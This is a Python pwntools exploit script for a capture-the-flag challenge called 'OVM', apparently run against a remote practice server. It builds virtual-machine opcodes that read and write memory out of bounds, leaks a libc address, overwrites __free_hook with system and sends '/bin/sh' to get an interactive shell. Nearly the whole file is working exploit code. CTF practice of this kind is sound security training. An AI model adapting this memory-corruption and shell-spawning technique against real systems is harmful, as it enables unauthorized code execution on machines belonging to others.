#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/25 10:32:32
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
# sh = process("./pwn")
if debug:
    sh = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 27727
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('pwn')
opcode = []
def mov_reg_num(reg_index,data):
    # reg[reg_index] = (data&0xff000000)>>24
    opcode.append(u32((p8(0x10)+p8(reg_index)+p8(0)+p8((data&0xff000000)>>24))[::-1]))
    # reg[9] = 24
    opcode.append(u32((p8(0x10)+p8(9)+p8(0)+p8(24))[::-1]))
    # reg[reg_index] = reg[reg_index] << 24
    opcode.append(u32((p8(0xc0)+p8(reg_index)+p8(reg_index)+p8(9))[::-1]))
    # reg[8] = (data&0x00ff0000)>>16
    opcode.append(u32((p8(0x10)+p8(8)+p8(0)+p8((data&0x00ff0000)>>16))[::-1]))
    # reg[9] = 16
    opcode.append(u32((p8(0x10)+p8(9)+p8(0)+p8(16))[::-1]))
    # reg[8] = reg[8] << 16
    opcode.append(u32((p8(0xc0)+p8(8)+p8(8)+p8(9))[::-1]))
    # reg[reg_index] = reg[8] | reg[reg_index]
    opcode.append(u32((p8(0xa0)+p8(reg_index)+p8(8)+p8(reg_index))[::-1]))
    # reg[8] = (data&0x0000ff00) >> 8
    opcode.append(u32((p8(0x10)+p8(8)+p8(0)+p8((data&0x0000ff00)>>8))[::-1]))
    # reg[9] = 8
    opcode.append(u32((p8(0x10)+p8(9)+p8(0)+p8(8))[::-1]))
    # reg[8] = reg[8] << 8
    opcode.append(u32((p8(0xc0)+p8(8)+p8(8)+p8(9))[::-1]))
    # reg[reg_index] = reg[8] | reg[reg_index]
    opcode.append(u32((p8(0xa0)+p8(reg_index)+p8(8)+p8(reg_index))[::-1]))
    # reg[8] = data&0x000000ff
    opcode.append(u32((p8(0x10)+p8(8)+p8(0)+p8(data&0x000000ff))[::-1]))
    # reg[reg_index] = reg[8] | reg[reg_index]
    opcode.append(u32((p8(0xa0)+p8(reg_index)+p8(8)+p8(reg_index))[::-1]))

# memory[reg1] = reg2
def mov_mem_reg(reg1,reg2):
    opcode.append(u32((p8(0x40)+p8(reg2)+p8(0)+p8(reg1))[::-1]))
# reg1 = memory[reg2]
def mov_reg_mem(reg1,reg2):
    opcode.append(u32((p8(0x30)+p8(reg1)+p8(0)+p8(reg2))[::-1]))

# reg1 = reg1 + reg2
def add_reg_reg(reg1,reg2):
    opcode.append(u32((p8(0x70)+p8(reg1)+p8(reg1)+p8(reg2))[::-1]))

def show_reg():
    opcode.append(0x000000ff)
exit_offset = libc.symbols['exit']
free_hook_offset = libc.symbols['__free_hook']
log.info("exit_offset=>{}".format(hex(exit_offset)))
offset = free_hook_offset - exit_offset - 8
log.info("free_hook_offset=>{}".format(hex(free_hook_offset)))
# reg[0] = -0x20
mov_reg_num(0,0xffffffe0)
# reg[1] = memory[reg[0]] 
mov_reg_mem(1,0)
# reg[0] = -0x1f
mov_reg_num(0,0xffffffe1)
# reg[2] = memory[reg[0]] 
mov_reg_mem(2,0)
# reg[0] = offset
mov_reg_num(3,offset)
# reg[1] = reg[3] + reg[1]
add_reg_reg(1,3)
# reg[0] = -8
mov_reg_num(0,0xfffffff8)
# memorty[reg[0]] = reg[1]
mov_mem_reg(0,1)
# reg[0] = -7
mov_reg_num(0,0xfffffff9)
# memorty[-8] = reg[2]
mov_mem_reg(0,2)
# leak_addr
show_reg()

sh.sendlineafter('PC:','0')
sh.sendlineafter('SP','0')
sh.sendlineafter('CODE SIZE:',str(len(opcode)))
sh.recvuntil("CODE: ")

for i in opcode:
   sh.sendline(str(i))

sh.recvuntil("R1: ")
low_addr = int(sh.recv(8),16)
sh.recvuntil("R2: ")
high_addr = int(sh.recv(4),16)
leak_addr = (high_addr << 32) + low_addr
# leak_addr = leak_addr - 
# log.info("leak_addr=>{}".format(hex(leak_addr)))
libc_base = leak_addr - (free_hook_offset - 8)
system_addr = libc_base + libc.symbols['system']
log.info("libc_base=>{}".format(hex(libc_base)))
log.info("system_addr=>{}".format(hex(system_addr)))
sh.recvuntil("HOW DO YOU FEEL AT OVM?\n")
# gdb.attach(sh)
# pause()
sh.sendline("/bin/sh\x00"+p64(system_addr))
sh.interactive()